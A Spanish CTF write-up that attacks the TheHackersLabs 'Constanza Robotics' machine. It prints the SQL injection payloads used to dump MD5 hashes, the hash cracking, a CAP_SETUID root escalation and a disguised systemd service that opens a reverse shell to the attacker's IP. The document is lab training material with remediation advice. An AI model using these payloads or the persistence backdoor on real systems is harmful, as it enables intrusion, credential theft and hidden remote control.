---
title: "TheHackersLabs: Constanza Robotics"
date: 2026-08-25T00:00:00+02:00
draft: false
description: "Un recorrido completo por Constanza Robotics: enumeracion de la superficie expuesta, explotacion de SQL injection en el portal de empleados, crackeo de credenciales MD5, acceso SSH, escalada mediante una capability CAP_SETUID mal asignada y persistencia a traves de systemd."
tags:
  - TheHackersLabs
  - Write-up
  - SQL Injection
  - Linux Capabilities
  - Privilege Escalation
  - systemd
categories:
  - Write-ups
---

La máquina Constanza Robotics de TheHackersLabs plantea una cadena de ataque que comienza con la enumeración de una intranet de robótica industrial y termina con control administrativo completo del sistema. El punto de entrada es un formulario de autenticación vulnerable a SQL injection, que permite eludir el login, enumerar la base de datos y extraer hashes MD5 de usuarios. Tras recuperar credenciales reutilizadas y validarlas contra SSH, la escalada de privilegios se consigue mediante una capability CAP_SETUID asignada a un binario Python capaz de ejecutar código arbitrario. El compromiso se cierra con el despliegue de persistencia a nivel de sistema mediante una unidad systemd.

IP objetivo: 192.168.0.63. IP atacante: 192.168.0.55. Las flags se muestran parcialmente censuradas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

## Reconocimiento — Escaneo de puertos

El primer paso es un descubrimiento de hosts en la red local para localizar la máquina objetivo:

```
$ nmap -sP 192.168.0.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 18:51 +0200
Nmap scan report for 192.168.0.63
Host is up (0.00032s latency).
MAC Address: 08:00:27:C2:C7:86 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.0.55
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 11.68 seconds
```

Se define la variable de objetivo para reutilizarla en los comandos posteriores:

```
$ export TARGET=192.168.0.63
```

Con el objetivo identificado, se ejecuta un escaneo SYN sobre el espacio completo de puertos TCP, incluyendo detección de versiones y scripts por defecto en la misma pasada:

```
$ sudo nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn -oN nmap_tcp_full.txt "$TARGET"
[sudo] contraseña para kali:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 18:52 +0200
Nmap scan report for 192.168.0.63
Host is up (0.00032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey:
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: Constanza Robotics — Robótica industrial de precisión
|_http-server-header: Apache/2.4.68 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
MAC Address: 08:00:27:C2:C7:86 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
```

![Enumeración inicial de la máquina objetivo](/images/writeups/constanza-robotics/01-nmap-tcp-full.png)

El escaneo revela tres puertos TCP abiertos: SSH sobre OpenSSH 9.2p1, un servidor web Apache 2.4.68 alojando el portal de Constanza Robotics, y MariaDB expuesto sin acceso no autenticado. El servicio web se convierte en el vector prioritario de enumeración.

## Web — Fuerza bruta de directorios

Se ejecuta un escaneo de directorios y archivos con extensiones habituales de backend:

```
$ ffuf -c -u "http://$TARGET/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -e .php,.html,.js,.txt,.bak -mc 200,204,301,302,307,401,403 -fs 7867 -rate 100 -t 30 -of json -o ffuf_root.json

    /'___\  /'___\           /'___\
   /\ \__/ /\ \__/  __  __  /\ \__/
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
     \ \_\   \ \_\  \ \____/  \ \_\
      \/_/    \/_/   \/___/    \/_/

   v2.1.0-dev

:: Method           : GET
:: URL              : http://192.168.0.63/FUZZ
:: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
:: Extensions       : .php .html .js .txt .bak
:: Output file      : ffuf_root.json
:: File format      : json
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 30
:: Matcher          : Response status: 200,204,301,302,307,401,403
:: Filter           : Response size: 7867

.php            [Status: 403, Size: 317, Words: 21, Lines: 10, Duration: 0ms]
.html           [Status: 403, Size: 317, Words: 21, Lines: 10, Duration: 0ms]
login.php       [Status: 200, Size: 1091, Words: 179, Lines: 30, Duration: 3ms]
assets          [Status: 301, Size: 353, Words: 21, Lines: 10, Duration: 0ms]
contacto.html   [Status: 200, Size: 4541, Words: 894, Lines: 102, Duration: 14ms]
productos.html  [Status: 200, Size: 6087, Words: 1339, Lines: 141, Duration: 11ms]
```

![Enumeración de contenido web con ffuf](/images/writeups/constanza-robotics/02-ffuf-root-enumeration.png)

El descubrimiento revela login.php como ruta de interés, además del directorio assets y de las páginas públicas contacto.html y productos.html.

## Web — Análisis del formulario de login

La página principal presenta el sitio corporativo de Constanza Robotics, con un acceso de empleados que conduce a login.php.

![Página principal de Constanza Robotics](/images/writeups/constanza-robotics/03-web-home.png)

![Formulario de acceso de empleados](/images/writeups/constanza-robotics/04-login-page.png)

Interceptando el formulario con Burp Suite, se envía una autenticación de prueba:

```
POST /login.php HTTP/1.1
Host: 192.168.0.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://192.168.0.63
Connection: keep-alive
Referer: http://192.168.0.63/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=test&password=test
```

```
HTTP/1.1 401 Unauthorized
Date: Mon, 24 Aug 2026 20:23:44 GMT
Server: Apache/2.4.68 (Debian)
Content-Length: 1150
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Acceso empleados — Constanza Robotics

Intranet · acceso restringido

<div class="alert">Usuario o contraseña incorrectos.</div>

<form method="POST" action="login.php">
    <div class="field">
      <label for="username">Usuario</label>
      <input id="username" name="username" type="text" autocomplete="off" autofocus>
    </div>
    <div class="field">
      <label for="password">Contraseña</label>
      <input id="password" name="password" type="password" autocomplete="off">
    </div>
    <button type="submit" class="btn btn-accent">Acceder <span class="arrow">→</span></button>
  </form>

<div class="login-note">CONSTANZA-INTRANET v1.2 · uso interno</div>
```

![Burp Suite: autenticación de prueba y respuesta HTTP 401](/images/writeups/constanza-robotics/05-burp-baseline-401.png)

## Explotación — Inyección SQL en el formulario de acceso

Se prueba el bypass clásico de autenticación mediante comilla simple, operador lógico y comentario:

```
POST /login.php HTTP/1.1
Host: 192.168.0.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://192.168.0.63
Connection: keep-alive
Referer: http://192.168.0.63/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=' OR 1=1#&password=test
```

```
HTTP/1.1 200 OK
Date: Mon, 24 Aug 2026 21:12:19 GMT
Server: Apache/2.4.68 (Debian)
Vary: Accept-Encoding
Content-Length: 842
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Acceso empleados — Constanza Robotics

Intranet · acceso restringido

<div class="alert ok">
    Sesión iniciada como <strong>pperez</strong>
    (rol: user).
  </div>
  <p style="font-size:.9rem;color:var(--slate);text-align:center;">
    El panel de gestión está en mantenimiento. Contacta con sistemas.
  </p>

<div class="login-note">CONSTANZA-INTRANET v1.2 · uso interno</div>
```

![Burp Suite: bypass de autenticación con OR 1=1](/images/writeups/constanza-robotics/06-burp-sqli-bypass.png)

Confirmación de sintaxis del motor: el payload equivalente con comentario nativo de MySQL también funciona. Esto confirma ausencia total de saneamiento (comillas, OR, #, espacios pasan sin modificación), descartando la existencia de WAF o funciones de escapado como addslashes().

### Conteo de columnas (ORDER BY)

Al probar ORDER BY sin forzar la condición a verdadero, la cláusula WHERE username='' sigue siendo falsa, por lo que el resultado era indistinguible de un login fallido normal. Combinando ambas técnicas:

```
username=' OR 1=1 ORDER BY 1-- -&password=x  → 200 OK (login exitoso)
username=' OR 1=1 ORDER BY 2-- -&password=x  → 200 OK (login exitoso)
username=' OR 1=1 ORDER BY 3-- -&password=x  → 200 OK (login exitoso)
username=' OR 1=1 ORDER BY 4-- -&password=x  → falla / rompe el bypass
```

```
POST /login.php HTTP/1.1
Host: 192.168.0.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.0.63
Connection: keep-alive
Referer: http://192.168.0.63/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=' OR 1=1 ORDER BY 3-- -&password=test
```

```
HTTP/1.1 200 OK
Date: Mon, 24 Aug 2026 21:14:33 GMT
Server: Apache/2.4.68 (Debian)
Vary: Accept-Encoding
Content-Length: 843
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Acceso empleados — Constanza Robotics

Intranet · acceso restringido

<div class="alert ok">
    Sesión iniciada como <strong>csalas</strong>
    (rol: admin).
  </div>
  <p style="font-size:.9rem;color:var(--slate);text-align:center;">
    El panel de gestión está en mantenimiento. Contacta con sistemas.
  </p>

<div class="login-note">CONSTANZA-INTRANET v1.2 · uso interno</div>
```

![Burp Suite: conteo de columnas con ORDER BY 3](/images/writeups/constanza-robotics/07-burp-order-by.png)

### Identificación de columnas reflejadas (UNION SELECT)

Confirmadas tres columnas, se construye una unión con valores controlados para identificar qué posiciones se reflejan en la interfaz:

```
POST /login.php HTTP/1.1
Host: 192.168.0.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: http://192.168.0.63
Connection: keep-alive
Referer: http://192.168.0.63/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=' UNION SELECT 'colA','colB','colC'-- -&password=test
```

```
HTTP/1.1 200 OK
Date: Mon, 24 Aug 2026 21:17:16 GMT
Server: Apache/2.4.68 (Debian)
Vary: Accept-Encoding
Content-Length: 840
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Acceso empleados — Constanza Robotics

Intranet · acceso restringido

<div class="alert ok">
    Sesión iniciada como <strong>colB</strong>
    (rol: colC).
  </div>
  <p style="font-size:.9rem;color:var(--slate);text-align:center;">
    El panel de gestión está en mantenimiento. Contacta con sistemas.
  </p>

<div class="login-note">CONSTANZA-INTRANET v1.2 · uso interno</div>
```

![Burp Suite: identificación de columnas reflejadas con UNION SELECT](/images/writeups/constanza-robotics/08-burp-union-reflection.png)

La respuesta confirma que la segunda columna se refleja como nombre de usuario y la tercera como rol, mientras que la primera no aparece en la interfaz aunque debe mantener compatibilidad de tipo con la consulta original.

### Enumeración de tablas

Con una columna reflejada identificada, se consulta el catálogo de MariaDB para listar las tablas del esquema activo:

```
POST /login.php HTTP/1.1
Host: 192.168.0.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 144
Origin: http://192.168.0.63
Connection: keep-alive
Referer: http://192.168.0.63/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=' UNION SELECT 'colA',GROUP_CONCAT(table_name,0x7c),'x'
FROM information_schema.tables WHERE table_schema=database()-- -&password=test
```

```
HTTP/1.1 200 OK
Date: Mon, 24 Aug 2026 21:18:54 GMT
Server: Apache/2.4.68 (Debian)
Vary: Accept-Encoding
Content-Length: 839
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Acceso empleados — Constanza Robotics

Intranet · acceso restringido

<div class="alert ok">
    Sesión iniciada como <strong>users|</strong>
    (rol: x).
  </div>
  <p style="font-size:.9rem;color:var(--slate);text-align:center;">
    El panel de gestión está en mantenimiento. Contacta con sistemas.
  </p>

<div class="login-note">CONSTANZA-INTRANET v1.2 · uso interno</div>
```

![Burp Suite: enumeración de la tabla users desde information_schema](/images/writeups/constanza-robotics/09-burp-tables-enumeration.png)

### Extracción de credenciales

Identificada la tabla users, se concatenan usuario, hash de contraseña y rol en una sola respuesta:

```
POST /login.php HTTP/1.1
Host: 192.168.0.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: http://192.168.0.63
Connection: keep-alive
Referer: http://192.168.0.63/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=' UNION SELECT 'colA',GROUP_CONCAT(username,0x3a,password,0x3a,role,0x7c),'x'
FROM users-- -&password=test
```

```
HTTP/1.1 200 OK
Date: Mon, 24 Aug 2026 21:20:15 GMT
Server: Apache/2.4.68 (Debian)
Vary: Accept-Encoding
Content-Length: 1111
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Acceso empleados — Constanza Robotics

Intranet · acceso restringido

<div class="alert ok">
    Sesión iniciada como <strong>pperez:dea56e47f1c62c30b83b70eb281a6c39:user|,agomez:8afa847f50a716e64932d995c8e7435a:user|,jruiz:f25a2fc72690b780b2a14e140ef6a9e0:user|,csalas:0b04f0f2f8a079bf984225c01ba99a0d:admin|,mtorres:aaef70f35bbc718528c1e005e1e59d45:user|,dnavarro:dac8029f94f09117ad4f0dc5f70b69e1:user|</strong>
    (rol: x).
  </div>
  <p style="font-size:.9rem;color:var(--slate);text-align:center;">
    El panel de gestión está en mantenimiento. Contacta con sistemas.
  </p>

<div class="login-note">CONSTANZA-INTRANET v1.2 · uso interno</div>
```

![Burp Suite: extracción de usuarios, hashes MD5 y roles](/images/writeups/constanza-robotics/10-burp-users-extraction.png)

### Causa raíz

La aplicación construye la consulta SQL mediante concatenación directa de entrada de usuario, sin prepared statements ni sanitización:

```
// Patrón vulnerable inferido
$query = "SELECT username, password, role FROM users WHERE username='$username' AND password='$password'";
```

## Crackeo de hashes

Los hashes extraídos se almacenan en un fichero local:

```
$ nano hashes.txt
```

```
$ cat hashes.txt
pperez:dea56e47f1c62c30b83b70eb281a6c39
agomez:8afa847f50a716e64932d995c8e7435a
jruiz:f25a2fc72690b780b2a14e140ef6a9e0
csalas:0b04f0f2f8a079bf984225c01ba99a0d
mtorres:aaef70f35bbc718528c1e005e1e59d45
dnavarro:dac8029f94f09117ad4f0dc5f70b69e1
```

Se ejecuta John the Ripper en modo raw-md5 contra rockyou.txt:

```
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 6 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 3 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2026-08-24 23:25) 0g/s 32598Kp/s 32598Kc/s 97795KC/s fuckyooh21..*7¡Vamos!
Session completed.
```

```
$ john --show --format=raw-md5 hashes.txt
pperez:barcelona
agomez:princess
jruiz:iloveyou
3 password hashes cracked, 3 left
```

![John the Ripper: recuperación de contraseñas a partir de hashes MD5](/images/writeups/constanza-robotics/11-john-md5-cracking.png)

## Movimiento lateral — Acceso SSH

Se valida la credencial recuperada contra el servicio SSH expuesto:

```
$ hydra -C creds.txt -t 1 ssh://192.168.0.63
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-24 23:30:57
[DATA] max 1 task per 1 server, overall 1 task, 3 login tries, ~3 tries per task
[DATA] attacking ssh://192.168.0.63:22/
[22][ssh] host: 192.168.0.63 login: pperez password: barcelona
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-24 23:31:02
```

![Hydra: validación de pperez:barcelona contra SSH](/images/writeups/constanza-robotics/12-hydra-ssh-validation.png)

Con la credencial validada, se inicia sesión por SSH:

```
$ ssh pperez@192.168.0.63
The authenticity of host '192.168.0.63 (192.168.0.63)' can't be established.
ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.63' (ED25519) to the list of known hosts.
pperez@192.168.0.63's password:
Linux TheHackersLabs 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug  4 10:04:50 2026 from 192.168.1.137
pperez@TheHackersLabs:~$ whoami; id
pperez
uid=1001(pperez) gid=1001(pperez) grupos=1001(pperez)
pperez@TheHackersLabs:~$ cat user.txt
THL{XXXXXXXXXXXXXXX}
```

![Acceso SSH y flag de usuario](/images/writeups/constanza-robotics/13-cap-setuid-privesc.png)

## Escalada de privilegios — Enumeración de capabilities

Con acceso al sistema, se buscan Linux capabilities asignadas a binarios:

```
pperez@TheHackersLabs:~$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/opt/maint/pybackup cap_setuid=ep
```

/opt/maint/pybackup presenta cap_setuid=ep, una asignación crítica al tratarse de un ejecutable Python capaz de ejecutar código arbitrario proporcionado como argumento:

```
pperez@TheHackersLabs:~$ /opt/maint/pybackup -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
root@TheHackersLabs:~# id
uid=0(root) gid=1001(pperez) grupos=1001(pperez)
root@TheHackersLabs:~# cat /etc/shadow | head -3
root:yj9T$AA9oQMinlq3VEirU87hiR.$1Pdk6G.Cff4rXsZTFZ1FKVXtYOF3uuMjYdb50fIoXX2:20669:0:99999:7:::
daemon::20012:0:99999:7:::
bin::20012:0:99999:7:::
root@TheHackersLabs:~# cat /root/root.txt
THL{XXXXXXXXXXXXXXXXXX}
```

![Abuso de CAP_SETUID en pybackup y flag root](/images/writeups/constanza-robotics/14-systemd-persistence-service.png)

os.setuid(0) asigna el UID 0 al proceso gracias a la capability CAP_SETUID efectiva sobre pybackup, y os.execl reemplaza el proceso por una bash con la opción -p, que conserva los privilegios efectivos recién adquiridos. El acceso a /etc/shadow y a /root/root.txt confirma control administrativo completo sobre la máquina.

## Persistencia — Servicio systemd con reverse shell

Con root confirmado, se despliega un servicio systemd camuflado con nombre neutro, que abre una reverse shell hacia la máquina atacante en cada arranque del sistema:

```
root@TheHackersLabs:~# nano /etc/systemd/system/network-monitor.service
root@TheHackersLabs:~# cat /etc/systemd/system/network-monitor.service
[Unit]
Description=Network Monitoring Service
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.55/4444 0>&1'
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
root@TheHackersLabs:~# systemctl daemon-reload
root@TheHackersLabs:~# systemctl enable network-monitor.service
Created symlink /etc/systemd/system/multi-user.target.wants/network-monitor.service → /etc/systemd/system/network-monitor.service.
root@TheHackersLabs:~# systemctl start network-monitor.service
root@TheHackersLabs:~# systemctl is-enabled network-monitor.service
enabled
root@TheHackersLabs:~# systemctl status network-monitor.service
● network-monitor.service - Network Monitoring Service
Loaded: loaded (/etc/systemd/system/network-monitor.service; enabled; preset: enabled)
Active: active (running) since Mon 2026-08-24 23:52:30 CEST; 6s ago
Main PID: 1112 (bash)
Tasks: 2 (limit: 2315)
Memory: 1016.0K
CPU: 6ms
CGroup: /system.slice/network-monitor.service
├─1112 /bin/bash -c "bash -i >& /dev/tcp/192.168.0.55/4444 0>&1"
└─1113 bash -i
ago 24 23:52:30 TheHackersLabs systemd[1]: Started network-monitor.service - Network Monitoring Service.
```

![Servicio systemd creado, habilitado y en ejecución](/images/writeups/constanza-robotics/15-reverse-shell-root.png)

Verificación desde la máquina atacante:

```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.0.55] from (UNKNOWN) [192.168.0.63] 46442
bash: no se puede establecer el grupo de proceso de terminal (1112): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@TheHackersLabs:/# id && hostname
uid=0(root) gid=0(root) grupos=0(root)
TheHackersLabs
```

Los avisos de "grupo de proceso de terminal" y "sin control de trabajos" son habituales en shells no interactivas obtenidas por reverse shell (no hay TTY asignado); no afectan a la funcionalidad de la sesión root obtenida.

## Conclusión

La cadena de compromiso combina tres fallos independientes: ausencia total de saneamiento en el formulario de login que permite bypass y extracción completa de la base de datos vía SQL injection, uso de hashing MD5 sin sal para las contraseñas, y una capability CAP_SETUID mal asignada sobre un binario capaz de ejecutar código arbitrario. Como medidas correctivas: sustitución de la concatenación de consultas por prepared statements, hashing de contraseñas con un algoritmo adaptativo y con sal, y retirada de CAP_SETUID de cualquier binario que no la requiera de forma justificada.

Contenido desarrollado exclusivamente en entornos autorizados, con fines formativos y de investigación.
